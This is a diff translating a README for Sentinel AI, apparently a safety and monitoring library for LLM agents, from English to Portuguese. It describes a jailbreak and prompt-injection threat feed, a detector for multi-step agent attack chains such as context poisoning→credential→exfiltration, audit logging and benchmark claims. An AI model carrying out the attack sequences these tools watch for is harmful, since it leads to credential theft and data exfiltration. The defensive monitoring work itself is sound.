@@ -857,11 +859,11 @@ print(summary.risk_level)     # RiskLevel.CRITICAL
 print(summary.anomaly_count)  # 3
 ```
 
-Detects: destructive commands, data exfiltration, credential access, runaway loops, write spikes, and read-then-exfiltrate attack chains.
+Detecta: comandos destrutivos, exfiltração de dados, acesso a credenciais, loops descontrolados, picos de escrita e cadeias de ataque do tipo read-then-exfiltrate.
 
-### Drop-in SDK Guard Wrappers
+### Wrappers de Proteção Plug-and-Play para SDKs
 
-Add safety scanning to Anthropic or OpenAI API calls with one line of code:
+Adicione verificação de segurança a chamadas de API da Anthropic ou OpenAI com uma linha de código:
 
 ```python
 from anthropic import Anthropic
@@ -879,11 +881,11 @@ response = client.messages.create(
 # Raises BlockedOutputError if model output triggers safety scanners
 ```
 
-Also available for OpenAI: `guard_openai(OpenAI())`. Supports scan callbacks, non-blocking mode, and custom guard configuration.
+Também disponível para OpenAI: `guard_openai(OpenAI())`. Suporta callbacks de verificação, modo non-blocking e configuração customizada do guard.
 
-### Threat Intelligence Feed
+### Feed de Inteligência de Ameaças
 
-Query a MITRE ATLAS-aligned database of 27+ known LLM attack techniques:
+Consulte uma base de dados alinhada ao MITRE ATLAS com mais de 27 técnicas conhecidas de ataque a LLMs:
 
 ```python
 from sentinel.threat_intel import ThreatFeed, ThreatCategory
@@ -904,11 +906,11 @@ print(f"{len(injections)} known injection techniques")
 indicator = feed.get_by_id("JB-001")  # DAN jailbreak
 ```
 
-Covers: prompt injection, jailbreaks, data exfiltration, model manipulation, privilege escalation, social engineering, evasion techniques, and resource abuse.
+Cobre: prompt injection, jailbreaks, exfiltração de dados, manipulação de modelo, escalação de privilégio, engenharia social, técnicas de evasão e abuso de recursos.
 
-### Attack Chain Detector
+### Detector de Cadeia de Ataques
 
-Detect multi-step attack sequences that span multiple tool calls — where no single call is dangerous but the sequence reveals malicious intent:
+Detecta sequências de ataque em múltiplas etapas que abrangem várias chamadas de ferramenta — onde nenhuma chamada isolada é perigosa, mas a sequência revela intenção maliciosa:
 
 ```python
 from sentinel.attack_chain import AttackChainDetector
@@ -925,11 +927,11 @@ for chain in detector.active_chains():
     print(f"[{chain.severity.value}] {chain.name}: {chain.description}")
 ```
 
-Detects 6 chain patterns: recon→credential→exfiltrate, credential→exfiltrate, escalation→destruction, context poisoning→escalation, recon→escalation→persistence, and context poisoning→credential→exfiltration.
+Detecta 6 padrões de cadeia: recon→credential→exfiltrate, credential→exfiltrate, escalation→destruction, context poisoning→escalation, recon→escalation→persistence e context poisoning→credential→exfiltration.
 
-### Session Audit Trail
+### Trilha de Auditoria de Sessão
 
-Tamper-evident audit logging for agentic AI sessions — every tool call, blocked action, and anomaly is recorded with SHA-256 hash chaining for integrity verification. Export to JSON for SIEM integration (Splunk, Datadog, Elastic) and compliance reporting (SOC 2, ISO 27001):
+Registro de auditoria à prova de adulteração para sessões de IA agêntica — cada chamada de ferramenta, ação bloqueada e anomalia é registrada com encadeamento de hash SHA-256 para verificação de integridade. Exporta para JSON para integração com SIEM (Splunk, Datadog, Elastic) e relatórios de conformidade (SOC 2, ISO 27001):
 
 ```python
 from sentinel.session_audit import SessionAudit
@@ -960,11 +962,11 @@ timeline = audit.risk_timeline()
 # [{"timestamp": ..., "risk": "none", ...}, {"risk": "high", ...}, ...]
 ```
 
-Features: hash-chained entries (tamper detection), integrity verification, JSON/SIEM export, risk timeline, finding categorization, tool usage breakdown, session metadata (user, agent, model), and duration tracking.
+Recursos: entradas encadeadas por hash (detecção de adulteração), verificação de integridade, exportação JSON/SIEM, timeline de risco, categorização de findings, breakdown de uso de ferramentas, metadados de sessão (usuário, agente, modelo) e rastreamento de duração.
 
-### Session Guard (One-Line Safety for Agentic AI)
+### Session Guard (Segurança em Uma Linha para IA Agêntica)
 
-Drop-in safety layer that combines audit logging, attack chain detection, and threat intelligence into a single `check()` call. Wraps every tool call with allow/block verdicts, full audit trail, and real-time threat detection:
+Camada de segurança plug-and-play que combina audit logging, detecção de cadeia de ataques e inteligência de ameaças em uma única chamada `check()`. Envolve cada chamada de ferramenta com veredictos de allow/block, trilha de auditoria completa e detecção de ameaças em tempo real:
 
 ```python
 from sentinel.session_guard import SessionGuard
@@ -1003,11 +1005,11 @@ print(report["summary"]["blocked_calls"])
 print(report["active_chains"])
 ```
 
-Combines: SessionAudit (tamper-evident logging) + AttackChainDetector (multi-step attack detection) + ThreatFeed (known attack pattern matching). Configurable block threshold, custom rules, and full JSON export.
+Combina: SessionAudit (logging à prova de adulteração) + AttackChainDetector (detecção de ataques em múltiplas etapas) + ThreatFeed (correspondência com padrões de ataque conhecidos). Threshold de bloqueio configurável, regras customizadas e exportação JSON completa.
 
-#### Policy-as-Code for SessionGuard
+#### Policy-as-Code para o SessionGuard
 
-Define security policies as YAML files for version-controlled, auditable safety configuration:
+Defina políticas de segurança como arquivos YAML para uma configuração de segurança versionada e auditável:
 
 ```yaml
 # guard_policy.yaml
@@ -1046,9 +1048,9 @@ guard = policy.create_guard(session_id="s-1", user_id="user@org.com")
 # Guard now enforces all policy rules automatically
 ```
 
-### Session Replay & Forensic Analysis
+### Replay de Sessão e Análise Forense
 
-Load an exported audit trail and replay it for forensic analysis — extract IOCs, identify attack chains, generate incident reports:
+Carregue uma trilha de auditoria exportada e reproduza (replay) para análise forense — extraia IOCs, identifique cadeias de ataque, gere relatórios de incidente:
 
 ```python
 from sentinel.session_replay import SessionReplay
@@ -1077,9 +1079,9 @@ report = replay.incident_report()
 print(report.to_json())  # Full structured report with recommendations
 ```
 
-## Enterprise Features
+## Recursos Empresariais
 
-### Policy Engine
+### Motor de Políticas
 
 ```python
 from sentinel import SentinelGuard
@@ -1101,7 +1103,7 @@ scanners:
   blocked_terms: {enabled: true, terms: ["competitor", "internal"]}
 ```
 
-### Webhooks & Alerting
+### Webhooks e Alertas
 
 ```python
 from sentinel.webhooks import WebhookGuard
@@ -1113,7 +1115,7 @@ guard = WebhookGuard(
 )
 ```
 
-### Observability
+### Observabilidade
 
 ```python
 from sentinel.telemetry import InstrumentedGuard
@@ -1123,7 +1125,7 @@ guard = InstrumentedGuard()
 # guard.get_metrics() returns scan counts, latency, risk distribution
 ```
 
-### Authentication & Rate Limiting
+### Autenticação e Limitação de Taxa
 
 ```python
 from sentinel.auth import create_authenticated_app
@@ -1134,7 +1136,7 @@ app = create_authenticated_app()
 
 ## GitHub Action
 
-Add comprehensive security scanning to any project in 3 lines:
+Adicione uma verificação de segurança abrangente a qualquer projeto em 3 linhas:
 
 ```yaml
 # .github/workflows/security.yml — one-step comprehensive scan
@@ -1145,7 +1147,7 @@ Add comprehensive security scanning to any project in 3 lines:
     block-on: high           # Fail PR if high/critical risk found
 ```
 
-Or use individual scans for fine-grained control:
+Ou use verificações individuais para um controle mais granular:
 
 ```yaml
 # Supply chain attack detection
@@ -1173,9 +1175,9 @@ Or use individual scans for fine-grained control:
     upload-sarif: "true"
 ```
 
-### SARIF Output (GitHub Code Scanning)
+### Saída SARIF (GitHub Code Scanning)
 
-Generate [SARIF v2.1.0](https://sarifweb.azurewebsites.net/) output for integration with GitHub Code Scanning, Azure DevOps, and other static analysis tools:
+Gera saída em [SARIF v2.1.0](https://sarifweb.azurewebsites.net/) para integração com GitHub Code Scanning, Azure DevOps e outras ferramentas de análise estática:
 
 ```bash
 # CLI
@@ -1199,7 +1201,7 @@ print(sarif_to_json(sarif))
 
 ## Benchmark
 
-600-case benchmark suite covering prompt injection (including advanced jailbreaks and multilingual attacks), PII, harmful content, toxicity, hallucination detection, tool-use safety, obfuscation/encoding attacks, and secrets/credential detection:
+Suíte de benchmark com 600 casos cobrindo prompt injection (incluindo jailbreaks avançados e ataques multilíngues), PII, conteúdo nocivo, toxicidade, detecção de alucinação, segurança de uso de ferramentas, ataques de ofuscação/encoding e detecção de segredos/credenciais:
 
 ```
 Benchmark Results (600 cases)
@@ -1210,7 +1212,7 @@ Benchmark Results (600 cases)
   TP=362 FP=0 TN=238 FN=0
 ```
 
-Run the benchmark:
+Execute o benchmark:
 
 ```python
 from sentinel.benchmarks import run_benchmark
@@ -1218,27 +1220,27 @@ results = run_benchmark()
 print(results.summary())
 ```
 
-## Comparison
+## Comparação
 
-| Feature | Sentinel AI | NeMo Guardrails | LLM Guard | Guardrails AI |
+| Recurso | Sentinel AI | NeMo Guardrails | LLM Guard | Guardrails AI |
 |---------|:-----------:|:---------------:|:---------:|:-------------:|
-| Scan latency | **~0.05ms** | 100ms+ | 50ms+ | varies |
-| GPU required | **No** | Optional | Yes | Optional |
-| Core dependencies | **1** (`regex`) | 10+ | 10+ | 5+ |
-| Prompt injection | Yes | Yes | Yes | Yes |
-| PII detection + redact | Yes | No | Yes | Yes |
-| Tool-use safety | **Yes** | No | No | No |
-| Structured output validation | **Yes** | No | No | Yes |
-| Claude Code hooks | **Yes** | No | No | No |
-| MCP server | **Yes** | No | No | No |
-| Adversarial red-teaming | **Yes** | No | No | No |
-| Multi-turn tracking | **Yes** | Yes | No | No |
-| Streaming protection | Yes | No | No | No |
-| Multilingual injection (12 langs) | **Yes** | No | No | No |
-| SARIF output (GitHub Code Scanning) | **Yes** | No | No | No |
-| Claude Agent SDK integration | **Yes** | No | No | No |
+| Latência de verificação | **~0,05ms** | 100ms+ | 50ms+ | varia |
+| Requer GPU | **Não** | Opcional | Sim | Opcional |
+| Dependências core | **1** (`regex`) | 10+ | 10+ | 5+ |
+| Prompt injection | Sim | Sim | Sim | Sim |
+| Detecção de PII + redação | Sim | Não | Sim | Sim |
+| Segurança de uso de ferramentas | **Sim** | Não | Não | Não |
+| Validação de saída estruturada | **Sim** | Não | Não | Sim |
+| Hooks do Claude Code | **Sim** | Não | Não | Não |
+| Servidor MCP | **Sim** | Não | Não | Não |
+| Red-teaming adversarial | **Sim** | Não | Não | Não |
+| Rastreamento multi-turno | **Sim** | Sim | Não | Não |
+| Proteção de streaming | Sim | Não | Não | Não |
+| Injeção multilíngue (12 idiomas) | **Sim** | Não | Não | Não |
+| Saída SARIF (GitHub Code Scanning) | **Sim** | Não | Não | Não |
+| Integração com o Claude Agent SDK | **Sim** | Não | Não | Não |
 
-## Architecture
+## Arquitetura
 
 ```
 sentinel/
@@ -1268,7 +1270,7 @@ sentinel/
 sdk-js/                # TypeScript/JavaScript SDK
 ```
 
-## Development
+## Desenvolvimento
 
 ```bash
 git clone https://github.com/MaxwellCalkin/sentinel-ai.git
@@ -1277,6 +1279,6 @@ pip install -e ".[dev]"
 pytest tests/
 ```
 
-## License
+## Licença
 
-Apache 2.0 — see [LICENSE](LICENSE)
+Apache 2.0 — veja [LICENSE](LICENSE)
